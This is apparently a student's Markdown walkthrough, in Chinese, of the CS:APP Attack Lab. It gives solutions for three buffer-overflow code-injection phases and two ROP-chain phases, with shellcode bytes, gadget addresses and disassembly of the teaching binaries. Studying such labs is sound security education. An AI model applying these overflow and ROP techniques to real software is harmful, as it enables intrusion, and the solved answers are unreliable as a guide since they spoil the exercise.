## Attack Lab

- [x] problem1 代码注入

  `getbuf`将栈指针减少`0x28`，然后读入
  
  用`x rsp+0x28`可以看到返回地址，使溢出的字符串将返回地址修改为`0x004017c0`即可
  
  注意小端法存储

- [x] problem2 代码注入

  插入可执行代码，用来修改寄存器的值并转跳

  用附录B的方法可以简单的生成二进制代码

  ```assembly
  0000000000000000 <.text>:
     0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
     7:	68 ec 17 40 00       	pushq  $0x4017ec
     c:	c3                   	retq 
  ```

  为了执行这段代码，同上使溢出的字符串将返回地址改为`%rsp=0x5561dc78`

- [x] problem3 代码注入

  调用`touch3`并传入一个字符串

  因为`getbuf`的栈会被覆盖，所以将字符串存在父栈帧中，并把地址传给`%rdi`

  ```assembly
  0000000000000000 <.text>:
     0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
     7:	68 fa 18 40 00       	pushq  $0x4018fa
     c:	c3                   	retq  
  ```



- [x] problem4 ROP

  先`popq %rax`，在`0x4019ab`

  ```assembly
  00000000004019a7 <addval_219>:
    4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
    4019ad:	c3                   	retq   
  ```

  再`movq %rax %rdi`，在`0x4019c5`

  ```assembly
  00000000004019c3 <setval_426>:
    4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
    4019c9:	c3                   	retq   
  ```

  最后调用函数

- [x] problem5 ROP

  难点在于不知道字符串存储在栈中的位置

  一个可行解

  ```assembly
  movl 	$0x1,%eax				# %rax=1
  movq	%rax,%rdi
  movl	%eax,%edx
  movl	%edx,%ecx
  movl	%ecx,%esi
  lea		(%rdi,%rsi,1),%rax		# %rax=2
  movq	%rax,%rdi
  movl	%eax,%edx
  movl	%edx,%ecx
  movl	%ecx,%esi
  lea		(%rdi,%rsi,1),%rax		# %rax=4
  movq	%rax,%rdi
  movl	%eax,%edx
  movl	%edx,%ecx
  movl	%ecx,%esi
  lea		(%rdi,%rsi,1),%rax		# %rax=8
  movq	%rax,%rdi
  movl	%eax,%edx
  movl	%edx,%ecx
  movl	%ecx,%esi
  lea		(%rdi,%rsi,1),%rax		# %rax=16
  movq	%rax,%rdi
  movl	%eax,%edx
  movl	%edx,%ecx
  movl	%ecx,%esi
  lea		(%rdi,%rsi,1),%rax		# %rax=32
  movl	%eax,%edx
  movl	%edx,%ecx
  movl	%ecx,%esi
  movq	%rsp,%rax
  movq 	%rax,%rdi
  lea		(%rdi,%rsi,1),%rax		# %rax=%rsp+32
  movq	%rax,%rdi		
  0x4018fa touch3
  0x59b997fa
  ```

  ```assembly
  00000000004019d0 <mid_farm>:
    4019d0:	b8 01 00 00 00       	mov    $0x1,%eax
    4019d5:	c3                   	retq   
  00000000004019d6 <add_xy>:
    4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
    4019da:	c3                   	retq   
  ```

  ```assembly
  movl 	%ecx,%esi		# 0x401a27
  0000000000401a25 <addval_187>:
    401a25:	8d 87 89 ce 38 c0    	lea    -0x3fc73177(%rdi),%eax
    401a2b:	c3                   	retq  
    
  movl 	%edx,%ecx		# 0x401a34
  0000000000401a33 <getval_159>:
    401a33:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax
    401a38:	c3                   	retq   
    
  movl 	%eax,%edx		# 0x401a42
  0000000000401a40 <addval_487>:
    401a40:	8d 87 89 c2 84 c0    	lea    -0x3f7b3d77(%rdi),%eax
    401a46:	c3                   	retq  
  
  movq	%rsp,%rax		# 0x401aad
  0000000000401aab <setval_350>:
    401aab:	c7 07 48 89 e0 90    	movl   $0x90e08948,(%rdi)
    401ab1:	c3                   	retq  
  ```

  



#### 汇编代码

- ctarget

```assembly
Disassembly of section .text:

00000000004017a8 <getbuf>:
  4017a8:       48 83 ec 28             sub    $0x28,%rsp
  4017ac:       48 89 e7                mov    %rsp,%rdi
  4017af:       e8 8c 02 00 00          callq  401a40 <Gets>
  4017b4:       b8 01 00 00 00          mov    $0x1,%eax
  4017b9:       48 83 c4 28             add    $0x28,%rsp
  4017bd:       c3                      retq
  4017be:       90                      nop
  4017bf:       90                      nop

00000000004017c0 <touch1>:
  4017c0:       48 83 ec 08             sub    $0x8,%rsp
  4017c4:       c7 05 0e 2d 20 00 01    movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
  4017cb:       00 00 00
  4017ce:       bf c5 30 40 00          mov    $0x4030c5,%edi
  4017d3:       e8 e8 f4 ff ff          callq  400cc0 <puts@plt>
  4017d8:       bf 01 00 00 00          mov    $0x1,%edi
  4017dd:       e8 ab 04 00 00          callq  401c8d <validate>
  4017e2:       bf 00 00 00 00          mov    $0x0,%edi
  4017e7:       e8 54 f6 ff ff          callq  400e40 <exit@plt>

00000000004017ec <touch2>:
  4017ec:       48 83 ec 08             sub    $0x8,%rsp
  4017f0:       89 fa                   mov    %edi,%edx
  4017f2:       c7 05 e0 2c 20 00 02    movl   $0x2,0x202ce0(%rip)        # 6044dc <vlevel>
  4017f9:       00 00 00
  4017fc:       3b 3d e2 2c 20 00       cmp    0x202ce2(%rip),%edi        # 6044e4 <cookie>
  401802:       75 20                   jne    401824 <touch2+0x38>
  401804:       be e8 30 40 00          mov    $0x4030e8,%esi
  401809:       bf 01 00 00 00          mov    $0x1,%edi
  40180e:       b8 00 00 00 00          mov    $0x0,%eax
  401813:       e8 d8 f5 ff ff          callq  400df0 <__printf_chk@plt>
  401818:       bf 02 00 00 00          mov    $0x2,%edi
  40181d:       e8 6b 04 00 00          callq  401c8d <validate>
  401822:       eb 1e                   jmp    401842 <touch2+0x56>
  401824:       be 10 31 40 00          mov    $0x403110,%esi
  401829:       bf 01 00 00 00          mov    $0x1,%edi
  40182e:       b8 00 00 00 00          mov    $0x0,%eax
  401833:       e8 b8 f5 ff ff          callq  400df0 <__printf_chk@plt>
  401838:       bf 02 00 00 00          mov    $0x2,%edi
  40183d:       e8 0d 05 00 00          callq  401d4f <fail>
  401842:       bf 00 00 00 00          mov    $0x0,%edi
  401847:       e8 f4 f5 ff ff          callq  400e40 <exit@plt>

00000000004018fa <touch3>:
  4018fa:       53                      push   %rbx
  4018fb:       48 89 fb                mov    %rdi,%rbx
  4018fe:       c7 05 d4 2b 20 00 03    movl   $0x3,0x202bd4(%rip)        # 6044dc <vlevel>
  401905:       00 00 00
  401908:       48 89 fe                mov    %rdi,%rsi
  40190b:       8b 3d d3 2b 20 00       mov    0x202bd3(%rip),%edi        # 6044e4 <cookie>
  401911:       e8 36 ff ff ff          callq  40184c <hexmatch>
  401916:       85 c0                   test   %eax,%eax
  401918:       74 23                   je     40193d <touch3+0x43>
  40191a:       48 89 da                mov    %rbx,%rdx
  40191d:       be 38 31 40 00          mov    $0x403138,%esi
  401922:       bf 01 00 00 00          mov    $0x1,%edi
  401927:       b8 00 00 00 00          mov    $0x0,%eax
  40192c:       e8 bf f4 ff ff          callq  400df0 <__printf_chk@plt>
  401931:       bf 03 00 00 00          mov    $0x3,%edi
  401936:       e8 52 03 00 00          callq  401c8d <validate>
  40193b:       eb 21                   jmp    40195e <touch3+0x64>
  40193d:       48 89 da                mov    %rbx,%rdx
  401940:       be 60 31 40 00          mov    $0x403160,%esi
  401945:       bf 01 00 00 00          mov    $0x1,%edi
  40194a:       b8 00 00 00 00          mov    $0x0,%eax
  40194f:       e8 9c f4 ff ff          callq  400df0 <__printf_chk@plt>
  401954:       bf 03 00 00 00          mov    $0x3,%edi
  401959:       e8 f1 03 00 00          callq  401d4f <fail>
  40195e:       bf 00 00 00 00          mov    $0x0,%edi
  401963:       e8 d8 f4 ff ff          callq  400e40 <exit@plt>

0000000000401968 <test>:
  401968:       48 83 ec 08             sub    $0x8,%rsp
  40196c:       b8 00 00 00 00          mov    $0x0,%eax
  401971:       e8 32 fe ff ff          callq  4017a8 <getbuf>
  401976:       89 c2                   mov    %eax,%edx
  401978:       be 88 31 40 00          mov    $0x403188,%esi
  40197d:       bf 01 00 00 00          mov    $0x1,%edi
  401982:       b8 00 00 00 00          mov    $0x0,%eax
  401987:       e8 64 f4 ff ff          callq  400df0 <__printf_chk@plt>
  40198c:       48 83 c4 08             add    $0x8,%rsp
  401990:       c3                      retq
  401991:       90                      nop
  401992:       90                      nop
  401993:       90                      nop
  401994:       90                      nop
  401995:       90                      nop
  401996:       90                      nop
  401997:       90                      nop
  401998:       90                      nop
  401999:       90                      nop
  40199a:       90                      nop
  40199b:       90                      nop
  40199c:       90                      nop
  40199d:       90                      nop
  40199e:       90                      nop
  40199f:       90                      nop
```

- rtarget

```assembly
0000000000401994 <start_farm>:
  401994:	b8 01 00 00 00       	mov    $0x1,%eax
  401999:	c3                   	retq   

000000000040199a <getval_142>:
  40199a:	b8 fb 78 90 90       	mov    $0x909078fb,%eax
  40199f:	c3                   	retq   

00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	retq   

00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq   

00000000004019ae <setval_237>:
  4019ae:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)
  4019b4:	c3                   	retq   

00000000004019b5 <setval_424>:
  4019b5:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)
  4019bb:	c3                   	retq   

00000000004019bc <setval_470>:
  4019bc:	c7 07 63 48 8d c7    	movl   $0xc78d4863,(%rdi)
  4019c2:	c3                   	retq   

00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq   

00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3                   	retq   

00000000004019d0 <mid_farm>:
  4019d0:	b8 01 00 00 00       	mov    $0x1,%eax
  4019d5:	c3                   	retq   

00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	retq   

00000000004019db <getval_481>:
  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
  4019e0:	c3                   	retq   

00000000004019e1 <setval_296>:
  4019e1:	c7 07 99 d1 90 90    	movl   $0x9090d199,(%rdi)
  4019e7:	c3                   	retq   

00000000004019e8 <addval_113>:
  4019e8:	8d 87 89 ce 78 c9    	lea    -0x36873177(%rdi),%eax
  4019ee:	c3                   	retq   

00000000004019ef <addval_490>:
  4019ef:	8d 87 8d d1 20 db    	lea    -0x24df2e73(%rdi),%eax
  4019f5:	c3                   	retq   

00000000004019f6 <getval_226>:
  4019f6:	b8 89 d1 48 c0       	mov    $0xc048d189,%eax
  4019fb:	c3                   	retq   

00000000004019fc <setval_384>:
  4019fc:	c7 07 81 d1 84 c0    	movl   $0xc084d181,(%rdi)
  401a02:	c3                   	retq   

0000000000401a03 <addval_190>:
  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
  401a09:	c3                   	retq   

0000000000401a0a <setval_276>:
  401a0a:	c7 07 88 c2 08 c9    	movl   $0xc908c288,(%rdi)
  401a10:	c3                   	retq   

0000000000401a11 <addval_436>:
  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
  401a17:	c3                   	retq   

0000000000401a18 <getval_345>:
  401a18:	b8 48 89 e0 c1       	mov    $0xc1e08948,%eax
  401a1d:	c3                   	retq   

0000000000401a1e <addval_479>:
  401a1e:	8d 87 89 c2 00 c9    	lea    -0x36ff3d77(%rdi),%eax
  401a24:	c3                   	retq   

0000000000401a25 <addval_187>:
  401a25:	8d 87 89 ce 38 c0    	lea    -0x3fc73177(%rdi),%eax
  401a2b:	c3                   	retq   

0000000000401a2c <setval_248>:
  401a2c:	c7 07 81 ce 08 db    	movl   $0xdb08ce81,(%rdi)
  401a32:	c3                   	retq   

0000000000401a33 <getval_159>:
  401a33:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax
  401a38:	c3                   	retq   

0000000000401a39 <addval_110>:
  401a39:	8d 87 c8 89 e0 c3    	lea    -0x3c1f7638(%rdi),%eax
  401a3f:	c3                   	retq   

0000000000401a40 <addval_487>:
  401a40:	8d 87 89 c2 84 c0    	lea    -0x3f7b3d77(%rdi),%eax
  401a46:	c3                   	retq   

0000000000401a47 <addval_201>:
  401a47:	8d 87 48 89 e0 c7    	lea    -0x381f76b8(%rdi),%eax
  401a4d:	c3                   	retq   

0000000000401a4e <getval_272>:
  401a4e:	b8 99 d1 08 d2       	mov    $0xd208d199,%eax
  401a53:	c3                   	retq   

0000000000401a54 <getval_155>:
  401a54:	b8 89 c2 c4 c9       	mov    $0xc9c4c289,%eax
  401a59:	c3                   	retq   

0000000000401a5a <setval_299>:
  401a5a:	c7 07 48 89 e0 91    	movl   $0x91e08948,(%rdi)
  401a60:	c3                   	retq   

0000000000401a61 <addval_404>:
  401a61:	8d 87 89 ce 92 c3    	lea    -0x3c6d3177(%rdi),%eax
  401a67:	c3                   	retq   

0000000000401a68 <getval_311>:
  401a68:	b8 89 d1 08 db       	mov    $0xdb08d189,%eax
  401a6d:	c3                   	retq   

0000000000401a6e <setval_167>:
  401a6e:	c7 07 89 d1 91 c3    	movl   $0xc391d189,(%rdi)
  401a74:	c3                   	retq   

0000000000401a75 <setval_328>:
  401a75:	c7 07 81 c2 38 d2    	movl   $0xd238c281,(%rdi)
  401a7b:	c3                   	retq   

0000000000401a7c <setval_450>:
  401a7c:	c7 07 09 ce 08 c9    	movl   $0xc908ce09,(%rdi)
  401a82:	c3                   	retq   

0000000000401a83 <addval_358>:
  401a83:	8d 87 08 89 e0 90    	lea    -0x6f1f76f8(%rdi),%eax
  401a89:	c3                   	retq   

0000000000401a8a <addval_124>:
  401a8a:	8d 87 89 c2 c7 3c    	lea    0x3cc7c289(%rdi),%eax
  401a90:	c3                   	retq   

0000000000401a91 <getval_169>:
  401a91:	b8 88 ce 20 c0       	mov    $0xc020ce88,%eax
  401a96:	c3                   	retq   

0000000000401a97 <setval_181>:
  401a97:	c7 07 48 89 e0 c2    	movl   $0xc2e08948,(%rdi)
  401a9d:	c3                   	retq   

0000000000401a9e <addval_184>:
  401a9e:	8d 87 89 c2 60 d2    	lea    -0x2d9f3d77(%rdi),%eax
  401aa4:	c3                   	retq   

0000000000401aa5 <getval_472>:
  401aa5:	b8 8d ce 20 d2       	mov    $0xd220ce8d,%eax
  401aaa:	c3                   	retq   

0000000000401aab <setval_350>:
  401aab:	c7 07 48 89 e0 90    	movl   $0x90e08948,(%rdi)
  401ab1:	c3                   	retq   

0000000000401ab2 <end_farm>:
  401ab2:	b8 01 00 00 00       	mov    $0x1,%eax
  401ab7:	c3                   	retq   
  401ab8:	90                   	nop
  401ab9:	90                   	nop
  401aba:	90                   	nop
  401abb:	90                   	nop
  401abc:	90                   	nop
  401abd:	90                   	nop
  401abe:	90                   	nop
  401abf:	90                   	nop
```

